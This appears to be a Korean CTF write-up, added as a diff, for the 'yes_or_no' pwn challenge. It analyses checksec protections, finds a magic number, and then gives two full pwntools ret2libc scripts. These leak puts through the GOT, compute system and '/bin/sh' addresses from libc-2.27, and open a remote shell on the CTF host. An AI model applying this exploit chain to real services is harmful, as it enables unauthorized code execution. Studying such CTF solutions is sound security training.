@@ -1,0 +1,294 @@
+풀이단계
+
+1. 보호기법확인 
+
+checksec 명령어를 입력했을때
+
+CANARY : disabled
+FORTIFY : disabled
+NX : ENABLED
+PIE : disabled
+RELRO : Partial
+
+이렇게 보여진다.
+
+CANARY 와 FORTIFY 가 걸려있지않으므로 BOF를 일으킬수 있고
+
+NX 가 걸려있으므로 쉘코드는 사용이 불가하고
+
+PIE가 걸려있지 않기떄문에 해당주소에서만 실행이 가능하다
+
+RELRO 가 완벽하게 Full로 걸려있지않으므로 got overwirte 를 사용가능하다.
+
+쉘코드를 사용하지못하기 때문에 RTL 기법을 사용해서 BOF 를 일으켜야하는데
+
+여기서 libc-2.27 라는 파일이 따로 하나 주어져 해당 파일의 라이브러리주소를
+이용해 공격하면 될것같다.
+
+먼저 IDA를 이용해서 바이너리 코드를 보면 if문이 여러개걸려있는데 일단은
+프리패스를 할수있는 숫자를 구하기위해 gdb 에서 get 부분의 com (비교부분)
+에 break point 하고 r로 실행시켜본다 그리고 아무숫자나 넣으면
+
+rax(64바이트) 값이 나오는데 그 값이  32바이트의 eax 값이랑 같기떄문에
+if문을 통과할수있는 답이 된다.
+
+16진수로 : 0x960000
+십진수로 : 9830400
+
+
+
+우리가 구해야할것은 got 을 하기위한 1puts_plt 주소와 2puts_got 주소
+
+3main 주소 , 4libc 주소 , put의 5rdi 주소와 6ret 주소
+
+7put 의 offset 주소 , 8system offset 주소 , 9/bin/sh offset 주소
+
+10put , 11system , 12/bin/sh 주소
+
+
+puts_plt = p64(e.plt['puts'])
+puts_got = p64(e.got['puts'])
+main = p64(e.symbols['main'])
+
+# main 함수의경우 got과 plt 과함께 gotoverwirte 를 할것이므로
+# p64 패킹을 해준다. ( 64비트이므로)
+
+
+libc_base : 0x00007ffff79e4000
+
+
+pop_rdi = 0x400883
+ret = 0x40056e
+
+
+# 오프셋은 ( put - libc_base ) 이므로 put주소가 각각 다를수있다.
+# 따라서 함수를 이용해서 구한다.
+offset
+
+put_offset = libc.symbols['puts']
+system_offset = libc.symbols['system']
+bin_offset = libc.search('/bin/sh').next()
+
+
+이제 대략 다구했으므로 페이로드 작성법은
+
+진짜 libc_real 주소는 leak한 주소 - puts_offset 이고
+
+libc_real + system_offset 을해주면 system의 진짜주소이고
+libc_real + bin_offset 을 해주면 /bin/sh 의 진짜 주소이다.
+
+이제
+
+RTL 기법이고 쉘코드가 막혔기떄문에 페이로드를 2개 작성해야한다.
+
+첫번쨰 페이로드에서는
+
+버퍼 + rdi + got주소 + plt 주소 + main 주소
+
+우리가 넣어야할 페이로드 공간 !!
+
+두번째 페이로드를 작성해야하는데 작성하기에앞서
+
+system 주소와 /bin/sh 주소를 알아야한다.
+
+따라서 진짜 libc_real을 알아내야하는데 
+( libc_base 주소는 실행할떄마다 주소가 바뀜 )
+
+recv(6) + '\x00\x00' 으로 leak 해준다.(고정)
+
+( recv(6) >> 받는 주소가 6자리 이기떄문이고 자릿수를 맞춰주기위해
+'\x00\x00' 해줌 )
+
+여기서 libc_real = recv(6) + '\x00\x00' 이고
+
+libc_real + system_offset = system_addr
+libc_real + bin_offset = bin_addr 
+
+이다.
+
+이제 페이로드를 작성해보면
+
+버퍼 + rdi + 패킹한 bin주소 + ret 주소 + 패킹한 system주소
+
+
+
+
+@@@@@@@@페이로드 작성@@@@@@@@@@@
+## 내가 작성한 코드
+
+from pwn import *
+
+p = remote("ctf.j0n9hyun.xyz",3009)
+
+p.recvuntil("Show me your number~!\n")
+
+p.sendline("9830400")
+
+p.recvuntil("That's cool. Follow me\n")
+
+pop_rdi = p64(0x400883)
+ret = p64(0x40056e)
+
+put_offset = 0x80A42
+system_offset = 0x4F4E0
+bin_offset = 0x1B40FA
+
+put_plt = p64(0x400580)
+put_got = p64(0x601018)
+main_got = p64(0x4006c7)
+
+payload = "A"*26
+
+payload += pop_rdi		
+payload  += put_got
+payload  += put_plt
+payload  += main_got
+
+p. sendline(payload)
+
+put_addr = p.recv(6)
+
+put_addr += "\x00\x00"
+
+put_addr = u64(put_addr)
+
+
+log.info('leak = '+hex(put_addr))
+p.recvuntil("Show me your number~!\n")
+
+p.sendline("9830400")
+
+p.recvuntil("That's cool. Follow me\n")
+
+libc_real = put_addr - put_offset
+
+system_addr = libc_real + system_offset
+bin_addr = libc_real+bin_offset
+
+
+payload2 = "A"*26
+payload2 += pop_rdi		
+payload2 += p64(bin_addr)		 
+payload2 += ret			
+payload2 += p64(system_addr)		
+
+p.sendline(payload2)
+p.interactive()
+
+
+## 실패 
+# 이유 : 주소가 다름
+# 나는 계속해서 구해도 계속 똑같은 주소만 나옴
+# 따라서 다른방법으로 접근을 시도함.
+#  해당 아래 코드가 내가 접근한 방법
+
+
+
+
+# 정답 코드
+
+from pwn import *
+
+p=remote("ctf.j0n9hyun.xyz",3009)
+
+e=ELF("./yes_or_no")
+
+libc = ELF("./libc-2.27.so")
+
+
+p.recvuntil("Show me your number~!\n")
+
+p.sendline("9830400")
+
+p.recvuntil("That's cool. Follow me\n")
+
+ 
+
+pop_rdi = p64(0x0000000000400883)
+
+ret=p64(0x000000000040056e)
+
+
+puts_offset = libc.symbols['puts']
+
+sys_offset = libc.symbols['system']
+
+bin_offset = libc.search('/bin/sh').next()
+
+
+puts_got = p64(e.got['puts'])
+
+puts_plt = p64(e.plt['puts'])
+
+main_got = p64(e.symbols['main'])
+
+payload = "A"*26
+
+payload += pop_rdi
+
+payload += puts_got
+
+payload += puts_plt
+
+payload += main_got
+
+ 
+
+p.sendline(payload)
+
+ 
+
+puts_addr = p.recv(6)
+
+print(puts_addr)
+
+puts_addr += "\x00\x00"
+
+print(puts_addr)
+
+puts_addr = u64(puts_addr)
+
+ 
+
+log.info('leak = '+hex(puts_addr))
+
+p.recvuntil("Show me your number~!\n")
+
+ 
+
+p.sendline("9830400")
+
+ 
+
+p.recvuntil("That's cool. Follow me\n")
+
+ 
+
+libc_base_real = puts_addr-puts_offset
+
+ 
+
+system_addr = libc_base_real+sys_offset
+
+bin_sh_addr = libc_base_real+bin_offset
+
+ 
+
+print('system = '+hex(system_addr))
+
+ 
+
+payload2 = "A"*26
+
+payload2 += pop_rdi
+
+payload2 += p64(bin_sh_addr)
+
+payload2 += ret
+
+payload2 += p64(system_addr)
+
+p.sendline(payload2)
+
+p.interactive() 
+
